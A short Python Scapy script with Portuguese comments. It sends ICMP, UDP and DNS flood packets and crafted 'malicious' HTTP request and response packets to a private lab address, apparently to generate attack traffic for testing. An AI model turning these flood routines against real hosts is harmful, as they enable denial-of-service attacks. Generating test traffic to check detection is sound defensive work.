from scapy.all import *
destino ='192.168.1.150'
# Crie o pacote ICMP Flood
icmp_packet = IP(dst=destino)/ICMP(type="echo-request")/"This is an ICMP flood packet"
send(icmp_packet, count=100)

# Crie o pacote UDP Flood
udp_packet = IP(dst=destino)/UDP(dport=12345)/"This is a UDP flood packet"
send(udp_packet, count=100)

# Crie o pacote UDP Flood com tamanho grande
large_udp_packet = IP(dst=destino)/UDP(dport=12345)/Raw(load="A"*2000)
send(large_udp_packet)

# Crie o pacote DNS Flood
dns_packet = IP(dst=destino)/UDP(dport=53)/DNS(qd=DNSQR(qname="example.com"))
send(dns_packet, count=100)

# Crie o pacote HTTP POST malicioso
malicious_post_packet = IP(dst=destino)/TCP(dport=80)/Raw(load="POST / HTTP/1.1\r\nHost: example.com\r\n\r\nevil_payload")
send(malicious_post_packet)

# Crie o pacote HTTP GET malicioso
malicious_get_packet = IP(dst=destino)/TCP(dport=80)/Raw(load="GET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n")
send(malicious_get_packet)

# Crie o pacote HTTP com resposta maliciosa
malicious_response_packet = IP(dst=destino)/TCP(sport=80)/Raw(load="HTTP/1.1 500 Internal Server Error\r\nContent-Length: 0\r\n\r\n")
send(malicious_response_packet)
